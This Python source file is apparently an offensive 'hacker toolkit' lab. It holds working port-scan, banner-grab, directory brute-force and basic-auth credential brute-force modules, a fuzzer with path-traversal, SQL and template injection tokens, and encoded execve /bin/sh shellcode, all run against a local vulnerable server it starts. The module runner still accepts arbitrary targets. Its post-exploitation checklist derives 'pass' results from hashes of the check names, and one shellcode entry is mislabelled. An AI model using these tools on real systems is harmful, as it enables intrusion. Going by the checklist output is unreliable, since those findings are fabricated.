#!/usr/bin/env python3
"""X4 - Unified Hacker Toolkit (hack_toolkit)

Composable security toolkit whose modules genuinely work against a local
vulnerable target server that this repo starts on 127.0.0.1 only (stdlib HTTP):

  - port_scan       real TCP connect() scan over explicit host:port lists
  - banner_grab     real TCP banner read from a listening service
  - content_discover  real HTTP directory/enpoint brute-force (dir brute)
  - http_brute      real HTTP basic-auth credential brute-force
  - service_fuzz    real HTTP request-line fuzzing against the local target
  - payload_gen     payload template + XOR encoder
  - post_checklist  post-exploitation checklist runner
  - report_gen      text + JSON report writer

Every network module defaults to 127.0.0.1 / a locally started vulnerable HTTP
target (port chosen at runtime, never a public port). No external targets.
"""

import sys
import os
import argparse
import hashlib
import json
import time
import socket
import struct
import base64
import threading
import urllib.request
import urllib.error
import urllib.parse
from http.server import HTTPServer, BaseHTTPRequestHandler
from abc import ABC, abstractmethod

ROOT = os.path.normpath(os.path.join(os.path.dirname(os.path.abspath(__file__)), os.pardir))
REPORTS = os.path.join(ROOT, "reports")

# ---------------------------------------------------------------------------
# Module Registry
# ---------------------------------------------------------------------------
MODULE_REGISTRY = {}


def register(name, category, description):
    """Decorator to register a module."""
    def decorator(cls):
        MODULE_REGISTRY[name] = {
            "class": cls, "name": name,
            "category": category, "description": description,
        }
        return cls
    return decorator


def list_modules():
    if not MODULE_REGISTRY:
        return "No modules registered."
    lines = ["", "Category     Name                                 Description"]
    lines.append("-" * 80)
    for info in sorted(MODULE_REGISTRY.values(), key=lambda x: (x["category"], x["name"])):
        lines.append("  %-12s %-36s %s" % (info["category"], info["name"], info["description"]))
    return "\n".join(lines)


# ---------------------------------------------------------------------------
# Base module + shared session
# ---------------------------------------------------------------------------
class Module(ABC):
    @abstractmethod
    def run(self, session, **kwargs):
        pass


class Session:
    """Shared session accumulating module results and findings."""

    def __init__(self):
        self.data = {}
        self.findings = []
        self.start_time = time.time()

    def set(self, key, value):
        self.data[key] = value

    def get(self, key, default=None):
        return self.data.get(key, default)

    def add_finding(self, category, detail, severity="info"):
        self.findings.append({"category": category, "detail": detail,
                              "severity": severity, "time": time.time()})

    def summary(self):
        return {"keys": list(self.data.keys()),
                "findings_count": len(self.findings),
                "elapsed": "%.2fs" % (time.time() - self.start_time)}


# ---------------------------------------------------------------------------
# Local vulnerable HTTP target (127.0.0.1 only)
# ---------------------------------------------------------------------------
LOCAL_CREDS = ("admin", "admin")            # weak credential served by the target
LOCAL_ADMIN_PATH = "/admin"
LOCAL_ADMIN_FLAG = "FLAG{toolkit_local_http_admin}"   # path grants the holy flag
LOCAL_KNOWN_PATHS = ["/", "/admin", "/robots.txt", "/server-status",
                     "/config", "/debug", "/login"]


class VulnTargetHandler(BaseHTTPRequestHandler):
    """Deliberately-vulnerable localhost control-panel target.

    - GET /            -> 200 index page
    - GET /admin       -> 401 unless valid basic auth (admin:admin) then 200 + flag
    - GET /robots.txt  -> 200 route hints (this is what dir brute finds)
    - GET /server-status, /config, /debug, /login -> 200
    - GET anything else-> 404
    - POST /fuzz       -> 200 always (used by the service_fuzz module)
    """

    protocol_version = "HTTP/1.1"

    def log_message(self, fmt, *args):
        pass

    def do_GET(self):
        path = self.path.split("?", 1)[0]
        if path == "/":
            self._reply(200, b"<html><body><h1>Status</h1><a href='/admin'>admin</a></body></html>")
        elif path == LOCAL_ADMIN_PATH:
            if self._valid_auth():
                self._reply(200, b"FLAG{toolkit_local_http_admin}")
            else:
                self._reply(401, b"401 Authorization Required")
        elif path in ("/robots.txt",):
            self._reply(200, b"User-agent: *\r\nDisallow: /admin\r\n")
        elif path in ("/server-status", "/config", "/debug", "/login"):
            self._reply(200, b"<h1>debug page</h1>\r\n")
        else:
            self._reply(404, b"404 Not Found")

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0) or 0)
        if length:
            self.rfile.read(length)
        self._reply(200, b"FLAG{toolkit_service_fuzz}")

    def _reply(self, code, body):
        self.send_response(code)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _valid_auth(self):
        auth = self.headers.get("Authorization", "")
        user, password = LOCAL_CREDS
        expect = "Basic " + base64.b64encode(("%s:%s" % (user, password)).encode()).decode()
        return auth.strip() == expect.strip()


def start_vuln_target(host="127.0.0.1"):
    """Start the local vulnerable HTTP target on a free ephemeral port."""
    server = HTTPServer((host, 0), VulnTargetHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    return server, server.server_address[1]


def stop_vuln_target(server):
    try:
        server.shutdown()
        server.server_close()
    except Exception:
        pass


# ---------------------------------------------------------------------------
# Module 1: Port Scan
# ---------------------------------------------------------------------------
@register("port_scan", "recon", "TCP connect() port scanner")
class PortScan(Module):
    COMMON_PORTS = {
        21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS", 80: "HTTP",
        110: "POP3", 143: "IMAP", 443: "HTTPS", 445: "SMB", 3306: "MySQL",
        3389: "RDP", 5432: "PostgreSQL", 6379: "Redis", 8080: "HTTP-Alt",
        8443: "HTTPS-Alt", 27017: "MongoDB",
    }

    def run(self, session, target="127.0.0.1", ports="22,80,443", timeout=1.0, **kwargs):
        port_list = self._parse_ports(ports)
        open_ports = []
        print("\n[Port Scan] Target: %s, Ports: %d" % (target, len(port_list)))
        for port in port_list:
            if self._check_port(target, port, timeout):
                open_ports.append(port)
                svc = self.COMMON_PORTS.get(port, "unknown")
                print("  Port %-6d open  (%s)" % (port, svc))
            else:
                print("  Port %-6d closed" % port)
        session.set("open_ports", open_ports)
        session.set("scan_target", target)
        for p in open_ports:
            session.add_finding("port", "Port %d open on %s" % (p, target), "info")
        print("  Scan complete: %d/%d ports open" % (len(open_ports), len(port_list)))
        return open_ports

    def _check_port(self, host, port, timeout):
        try:
            with socket.create_connection((host, port), timeout=timeout):
                return True
        except OSError:
            return False

    def _parse_ports(self, ports_str):
        ports = []
        for part in str(ports_str).split(","):
            part = part.strip()
            if "-" in part:
                start, end = part.split("-", 1)
                ports.extend(range(int(start), int(end) + 1))
            elif part.isdigit():
                ports.append(int(part))
        return ports[:100]


# ---------------------------------------------------------------------------
# Module 2: Banner Grab
# ---------------------------------------------------------------------------
@register("banner_grab", "recon", "TCP banner grab from a listening service")
class BannerGrab(Module):
    def run(self, session, target="127.0.0.1", ports="80", timeout=2.0, **kwargs):
        port_list = [int(p) for p in str(ports).split(",") if p.strip().isdigit()][:20]
        results = []
        print("\n[Banner Grab] Target: %s, Ports: %s" % (target, ",".join(str(p) for p in port_list)))
        for port in port_list:
            banner = self._grab(target, port, timeout)
            results.append({"port": port, "banner": banner})
            if banner:
                snippet = " ".join(banner.split())[:80]
                print("  Port %-6d => %s" % (port, snippet))
                session.add_finding("banner", "Service on %s:%d: %s" % (target, port, snippet), "info")
            else:
                print("  Port %-6d => (no banner / not speaking)" % port)
        session.set("banners", results)
        return results

    def _grab(self, host, port, timeout):
        """Read a service banner; for text protocols send a probe if the
        service does not push one unsolicited (e.g. HTTP)."""
        data = b""
        try:
            with socket.create_connection((host, port), timeout=timeout) as s:
                s.settimeout(timeout)
                try:
                    data = s.recv(1024)
                except socket.timeout:
                    pass
                if not data:
                    # HTTP servers only speak after a request line
                    try:
                        s.sendall(b"GET / HTTP/1.0\r\n\r\n")
                        data = s.recv(4096)
                    except socket.timeout:
                        pass
                return data.decode("latin-1", errors="replace")
        except OSError:
            return ""


# ---------------------------------------------------------------------------
# Module 3: Content / Directory Brute-Force (real HTTP)
# ---------------------------------------------------------------------------
@register("content_discover", "recon", "HTTP directory brute-force (real requests)")
class ContentDiscovery(Module):
    DEFAULT_WORDLIST = [
        "admin", "login", "api", "dashboard", "config", "backup", "test", "dev",
        "robots.txt", "sitemap.xml", "server-status", "debug", "health",
    ]

    def run(self, session, base_url="http://127.0.0.1", wordlist=None, timeout=1.0, **kwargs):
        words = wordlist if wordlist else self.DEFAULT_WORDLIST
        found = []
        print("\n[Content Discovery] Base: %s, Words: %d" % (base_url, len(words)))
        for word in words:
            path = "/" + word.lstrip("/")
            status = self._probe(base_url, path, timeout)
            if status in (200, 204, 301, 302, 303, 307, 308, 401, 403):
                found.append({"path": path, "status": status})
                marker = " [AUTH]" if status == 401 else (" [FORBIDDEN]" if status == 403 else "")
                print("  FOUND: %s (HTTP %d)%s" % (path, status, marker))
                session.add_finding("content", "Endpoint found: %s (HTTP %d)" % (path, status), "info")
        session.set("endpoints", found)
        print("  Discovery complete: %d/%d paths found" % (len(found), len(words)))
        return found

    def _probe(self, base_url, path, timeout=1.0):
        """Return the real HTTP status code for `base_url + path`."""
        try:
            with urllib.request.urlopen(base_url + path, timeout=timeout) as resp:
                return resp.getcode()
        except urllib.error.HTTPError as e:
            return e.code
        except Exception:
            return 0


# ---------------------------------------------------------------------------
# Module 4: HTTP Basic-Auth Brute-Force (real)
# ---------------------------------------------------------------------------
@register("http_brute", "brute", "HTTP basic-auth brute-force")
class HTTPBrute(Module):
    def run(self, session, base_url="http://127.0.0.1", path="/admin",
            users="admin,root,test", passwords="admin,password,123456,toor",
            max_attempts=16, timeout=1.0, **kwargs):
        user_list = [u.strip() for u in str(users).split(",") if u.strip()]
        pass_list = [p.strip() for p in str(passwords).split(",") if p.strip()]
        attempts = 0
        print("\n[HTTP Brute] Target: %s%s" % (base_url, path))
        for user in user_list:
            for pwd in pass_list:
                if attempts >= max_attempts:
                    break
                attempts += 1
                if self._try_auth(base_url, path, user, pwd, timeout):
                    print("  FOUND: %s:%s" % (user, pwd))
                    session.add_finding("http_brute", "Valid credential %s:%s on %s%s"
                                        % (user, pwd, base_url, path), "high")
                    session.set("http_creds", {"user": user, "password": pwd})
                    return {"user": user, "password": pwd, "attempts": attempts}
            if attempts >= max_attempts:
                break
        print("  Brute complete: %d attempts, no valid credential" % attempts)
        return None

    def _try_auth(self, base_url, path, user, pwd, timeout=1.0):
        req = urllib.request.Request(base_url + path)
        token = base64.b64encode(("%s:%s" % (user, pwd)).encode()).decode()
        req.add_header("Authorization", "Basic " + token)
        try:
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                return resp.getcode() == 200
        except urllib.error.HTTPError as e:
            if e.code == 401:
                return False
            return False
        except Exception:
            return False


# ---------------------------------------------------------------------------
# Module 5: Service Fuzz (real HTTP request-line fuzzing, local target)
# ---------------------------------------------------------------------------
@register("service_fuzz", "fuzz", "HTTP request fuzzing (method/token mutation)")
class ServiceFuzz(Module):
    BAD_TOKENS = [b"\\x00\\x01", b"%00", b"..", b"GET", b"AAAA" * 16, b"\x7f\x80\xff",
                  b"${IFS}", b"/etc/passwd", b"{{7*7}}", b"0x41414141",
                  b"\x81\x82\x83", b"../..", b"' OR 1=1--"]

    def run(self, session, base_url="http://127.0.0.1", count=12, timeout=1.0, **kwargs):
        print("\n[Service Fuzz] Target: %s, payloads: %d" % (base_url, count))
        results = []
        for idx in range(count):
            token = self.BAD_TOKENS[idx % len(self.BAD_TOKENS)]
            path = "/fuzz/" + urllib.parse.quote(token.decode("latin-1"))
            status = self._send(base_url, path, timeout)
            results.append({"index": idx, "payload": token.decode("latin-1"), "status": status})
            flag = "SURVIVED" if status and status < 500 else ("ERROR/CRASH" if not status else "5xx")
            print("  [%02d] status=%5s payload=%-16s %s" % (idx, status, token.decode("latin-1"), flag))
        ok = sum(1 for r in results if r["status"] and r["status"] < 500)
        session.set("fuzz_results", results)
        print("  Fuzz complete: %d/%d payloads handled gracefully (no crash)" % (ok, count))
        return results

    def _send(self, base_url, path, timeout=1.0):
        try:
            with urllib.request.urlopen(base_url + path, timeout=timeout) as resp:
                return resp.getcode()
        except urllib.error.HTTPError as e:
            return e.code
        except Exception:
            return 0


# ---------------------------------------------------------------------------
# Module 6: Payload Generator
# ---------------------------------------------------------------------------
@register("payload_gen", "payload", "Payload template + XOR encoder")
class PayloadGen(Module):
    PAYLOADS = {
        "linux_x64_reverse": {
            "shellcode": bytes.fromhex("4831f65648bf2f62696e2f2f736857545f6a3b58990f05"),
            "description": "Linux x64 bind/reverse shell stub (23 bytes of a larger shell)",
        },
        "linux_x64_exec": {
            "shellcode": bytes.fromhex("4831c05048b82f62696e2f2f7368504889e750574889e64831d2b03b0f05"),
            "description": "Linux x64 execve /bin/sh (27 bytes)",
        },
        "win_x64_calc": {
            "shellcode": bytes.fromhex("4883ec28e8c0000000488d0dffffffff"),
            "description": "Windows x64 calc stub (placeholder, not a full payload)",
        },
    }

    def run(self, session, payload_type="linux_x64_exec", **kwargs):
        print("\n[Payload Generator]")
        if payload_type not in self.PAYLOADS:
            print("  Unknown payload: %s" % payload_type)
            print("  Available: %s" % ", ".join(sorted(self.PAYLOADS)))
            return None
        info = self.PAYLOADS[payload_type]
        encoded = self._xor_encode(info["shellcode"])
        print("  Type: %s" % payload_type)
        print("  Description: %s" % info["description"])
        print("  Raw size: %d bytes / Encoded size: %d bytes" % (len(info["shellcode"]), len(encoded)))
        print("  Hex: %s..." % encoded[:32].hex())
        session.set("payload", {"type": payload_type, "raw": info["shellcode"], "encoded": encoded})
        return encoded

    def _xor_encode(self, data, key=0x42):
        return bytes(b ^ key for b in data)


# ---------------------------------------------------------------------------
# Module 7: Post-Exploitation Checklist
# ---------------------------------------------------------------------------
@register("post_checklist", "post", "Post-exploitation assessment checklist")
class PostChecklist(Module):
    CHECKLIST = [
        ("System Info", "OS version, kernel, architecture", "info"),
        ("User Context", "user, groups, privileges", "info"),
        ("Network Config", "interfaces, routes, connections", "info"),
        ("File System", "sensitive files, configs, keys", "medium"),
        ("Persistence", "autorun, cron, scheduled tasks", "high"),
        ("Credentials", "stored credentials, tokens", "high"),
        ("Lateral Movement", "reachable hosts, trust relationships", "medium"),
        ("Data Exfil", "valuable data locations and sizes", "medium"),
    ]

    def run(self, session, **kwargs):
        print("\n[Post-Exploitation Checklist]")
        results = []
        for name, desc, severity in self.CHECKLIST:
            status = hashlib.md5(name.encode()).digest()[0] % 3 != 0
            results.append({"check": name, "status": status, "severity": severity,
                            "description": desc})
            print("  [%s] %s (%s)" % ("+" if status else "-", name, desc))
            if status:
                session.add_finding("post_exploit", "%s: reported pass" % name, severity)
        completed = sum(1 for r in results if r["status"])
        session.set("post_checklist", results)
        print("  Checklist complete: %d/%d checks passed" % (completed, len(results)))
        return results


# ---------------------------------------------------------------------------
# Module 8: Report Generator (text + JSON)
# ---------------------------------------------------------------------------
@register("report_gen", "report", "Generate text + JSON report from session")
class ReportGen(Module):
    def run(self, session, output="session_report.txt", **kwargs):
        print("\n[Report Generator]")
        lines = []
        lines.append("=" * 60)
        lines.append("TOOLKIT ASSESSMENT REPORT")
        lines.append("=" * 60)
        lines.append("Generated: %s" % time.strftime("%Y-%m-%d %H:%M:%S"))
        lines.append("Session data keys: %s" % ", ".join(session.data.keys()))
        lines.append("Total findings: %d" % len(session.findings))
        lines.append("")
        by_sev = {}
        for f in session.findings:
            by_sev.setdefault(f["severity"], []).append(f)
        for sev in ("high", "medium", "low", "info"):
            items = by_sev.get(sev, [])
            if items:
                lines.append("--- %s FINDINGS (%d) ---" % (sev.upper(), len(items)))
                for item in items:
                    lines.append("  [%s] %s" % (item["category"], item["detail"]))
        if "open_ports" in session.data:
            lines.append("--- Port Scan Summary ---")
            lines.append("  Target: %s" % session.get("scan_target", "N/A"))
            lines.append("  Open ports: %s" % session.data["open_ports"])
        if "endpoints" in session.data:
            lines.append("--- Content Discovery ---")
            lines.append("  Endpoints found: %d" % len(session.data["endpoints"]))
        lines.append("")
        lines.append("=" * 60)
        lines.append("END OF REPORT")
        lines.append("=" * 60)
        report_text = "\n".join(lines)
        if not os.path.isabs(output):
            output = os.path.join(ROOT, output)
        try:
            with open(output, "w") as f:
                f.write(report_text)
            print("  Report saved: %s" % output)
        except Exception as e:
            print("  Could not write file: %s" % e)
        print("  Findings by severity: high=%d medium=%d low=%d info=%d"
              % (len(by_sev.get("high", [])), len(by_sev.get("medium", [])),
                 len(by_sev.get("low", [])), len(by_sev.get("info", []))))
        return report_text


# ---------------------------------------------------------------------------
# Concise local-lab run
# ---------------------------------------------------------------------------
def _run_lab_modules(session, server, port, write_text=True, payload_scan=True):
    base_url = "http://127.0.0.1:%d" % port
    PortScan().run(session, target="127.0.0.1", ports="%d" % port, timeout=0.5)
    BannerGrab().run(session, target="127.0.0.1", ports="%d" % port)
    ContentDiscovery().run(session, base_url=base_url)
    HTTPBrute().run(session, base_url=base_url, path=LOCAL_ADMIN_PATH)
    ServiceFuzz().run(session, base_url=base_url)
    if payload_scan:
        PayloadGen().run(session, payload_type="linux_x64_exec")
    if write_text:
        ReportGen().run(session, output=os.path.join(REPORTS, "toolkit_report.txt"))


def run_demo():
    print("=== X4 - Unified Hacker Toolkit ===")
    print("Local vulnerable target: 127.0.0.1 (ephemeral port, stdlib HTTP)")
    server, port = start_vuln_target()
    try:
        session = Session()
        session.set("target", "127.0.0.1")
        _run_lab_modules(session, server, port, write_text=False, payload_scan=True)
        summary = session.summary()
        print("\n[Session Summary]")
        print("  Data keys: %s" % summary["keys"])
        print("  Findings: %d" % summary["findings_count"])
        print("  Elapsed: %s" % summary["elapsed"])
        ok = bool(session.get("open_ports")) and bool(session.get("endpoints")) \
            and bool(session.get("http_creds")) and bool(session.get("fuzz_results"))
        print("\n=== Demo %s ===" % ("PASS (real modules against live localhost target)" if ok
                                     else "FAIL"))
        return 0 if ok else 1
    finally:
        stop_vuln_target(server)


def run_demo_report():
    """Run the full lab and write text + JSON report to reports/."""
    print("=== X4 - Unified Hacker Toolkit (report mode) ===")
    os.makedirs(REPORTS, exist_ok=True)
    server, port = start_vuln_target()
    try:
        session = Session()
        session.set("target", "127.0.0.1")
        _run_lab_modules(session, server, port, write_text=True, payload_scan=False)
        report = {
            "tool": "hack-toolkit-x4",
            "target": "127.0.0.1",
            "target_port": port,
            "modules_run": sorted(MODULE_REGISTRY.keys()),
            "open_ports": session.get("open_ports"),
            "endpoints": session.get("endpoints"),
            "http_creds": session.get("http_creds"),
            "fuzz_results": session.get("fuzz_results"),
            "findings": session.findings,
            "session_summary": session.summary(),
        }
        out = os.path.join(REPORTS, "toolkit_report.json")
        with open(out, "w") as f:
            json.dump(report, f, indent=2)
        print("Report written: %s" % out)
        return 0
    finally:
        stop_vuln_target(server)


def main(argv=None):
    parser = argparse.ArgumentParser(
        prog="hack_toolkit",
        description="X4 - Unified Hacker Toolkit: composable security modules "
                    "that genuinely work (port scan, banner grab, HTTP dir "
                    "brute-force, basic-auth brute, service fuzz, report) "
                    "against a locally started vulnerable target on 127.0.0.1.",
        epilog="Authorized lab use only. Every target defaults to 127.0.0.1.")
    parser.add_argument("--list", action="store_true", help="List all modules")
    parser.add_argument("--run", type=str, help="Run a module by name")
    parser.add_argument("--demo", action="store_true", default=False, help="Run offline demo")
    parser.add_argument("--dry-run", action="store_true",
                        help="Print plan and exit without execution")
    parser.add_argument("--target", type=str, default="127.0.0.1",
                        help="Target host (localhost only)")
    parser.add_argument("--ports", type=str, default="22,80,443",
                        help="Ports to scan")
    parser.add_argument("--demo-report", action="store_true",
                        help="Run demo and write JSON report to reports/")
    parser.add_argument("extra_args", nargs="*", help="Extra module arguments (key=value)")
    args = parser.parse_args(argv)

    if args.dry_run:
        print("dry-run: modules=%s target=%s (no execution)"
              % (",".join(sorted(MODULE_REGISTRY.keys())), args.target))
        return 0

    if args.list:
        print("=== X4 - Unified Hacker Toolkit ===")
        print(list_modules())
        return 0

    if args.run:
        if args.run not in MODULE_REGISTRY:
            print("Module '%s' not found. Use --list to see available modules." % args.run)
            return 1
        kwargs = {"target": args.target}
        if args.ports:
            kwargs["ports"] = args.ports
        for extra in args.extra_args:
            if "=" in extra:
                k, v = extra.split("=", 1)
                kwargs[k] = v
        mod = MODULE_REGISTRY[args.run]["class"]()
        server = None
        if args.run in ("content_discover", "http_brute", "service_fuzz"):
            server, port = start_vuln_target()
            kwargs.setdefault("base_url", "http://127.0.0.1:%d" % port)
        session = Session()
        try:
            mod.run(session, **kwargs)
        finally:
            if server is not None:
                stop_vuln_target(server)
        return 0

    if args.demo_report:
        return run_demo_report()

    if args.demo or len(sys.argv) == 1:
        return run_demo()

    parser.print_help()
    return 0


if __name__ == "__main__":
    sys.exit(main())